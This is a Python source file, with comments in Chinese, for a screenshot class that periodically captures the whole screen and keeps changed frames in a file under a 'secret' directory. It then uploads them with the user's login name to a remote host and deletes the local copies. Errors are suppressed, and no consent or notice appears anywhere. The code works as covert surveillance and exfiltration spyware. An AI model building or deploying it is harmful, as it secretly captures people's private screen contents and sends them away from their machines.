import os, re, cv2, getpass, requests
import numpy as np
import pyscreenshot as ImageGrab
import AseScreenshot.comparing as cpr
import AseScreenshot.utility as util
from time import sleep
from datetime import datetime

class Screenshot():
    def __init__(self, secret_dir, secret_filename, ip_address, similarity_threshold, debug = False):
        self.secret_dir = secret_dir
        self.dist_host = ip_address
        self.secret_filename = secret_filename
        self.secret_file_path = f'{secret_dir}/{secret_filename}'
        self.similarity_threshold = similarity_threshold
        self.debug = debug
        self.username = getpass.getuser()
        self.row_splitor = '\\_*\\yxy*_\\'
        self.col_splitor = '\\_*\\yx*_\\'

    def check_same(self, pil_new_img): # 確認截圖與最新圖片的相似程度是否超過閾值
        pil_old_img = util.get_last_pic(self.secret_file_path, self.row_splitor, self.col_splitor)
        if pil_old_img == '': 
            return 'NON-EXIST' 
        old_img = cv2.cvtColor(np.asarray(pil_old_img), cv2.COLOR_RGB2BGR) # PIL to cv2
        new_img = cv2.cvtColor(np.asarray(pil_new_img), cv2.COLOR_RGB2BGR) # PIL to cv2
        similarity = cpr.IMG_comparing(old_img, new_img)
        if self.debug: # for debugging
            print(f'Similarity：{similarity}', f'Threshold：{self.similarity_threshold}', f'Is_same：{similarity > self.similarity_threshold}')
        return True if similarity > self.similarity_threshold else False

    def cycle_shot(self, time_interval = 10, limit = -1): # 週期性截圖
        '''
        :param time_interval: int 截圖時間間隔。
        :param limit: int 循環次數，設-1為無限。
        '''
        i = 0
        if not os.path.exists(self.secret_dir):
            os.makedirs(self.secret_dir)
        while(limit != i):
            self.quick_shot()
            sleep(time_interval)
            i += 1
            

    def quick_shot(self): # 截一次圖
        time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        img = ImageGrab.grab(childprocess=False)
        is_same_pic = self.check_same(img)
        if is_same_pic == 'NON-EXIST':
            util.save_to_secret(self.secret_file_path, img, 'w+', '', self.col_splitor )
        elif (not is_same_pic):
            util.save_to_secret(self.secret_file_path, img, 'a+', self.row_splitor, self.col_splitor )     
            time, pic, is_reach_max = util.get_first_data(self.secret_file_path, self.row_splitor, self.col_splitor)
            if is_reach_max or (time and pic and is_reach_max):
                self.upload_data(time, pic, is_reach_max)
        if self.debug:
            print(f'[Quick_shot] {time_stamp} IMAGE SAVE\n')       
    
    def upload_data(self, time, img, is_reach_max): # 上傳資料
        payload = {
            'computer_id': self.username,
            'timestamp': time,
            'data': img
        }

        try:
            r = requests.post(self.dist_host, data = payload)
            Response = r.text            
            file_data = open(self.secret_file_path, 'r').read()
            with open(self.secret_file_path, 'w', encoding='utf-8') as f:
                f.write(f"{self.row_splitor}".join(file_data.split(self.row_splitor)[1:]))
                f.close()            
            if self.debug:
                print(f'[Server msg] {Response}')
        except BaseException as e:
            
            if self.debug:
                print(e)
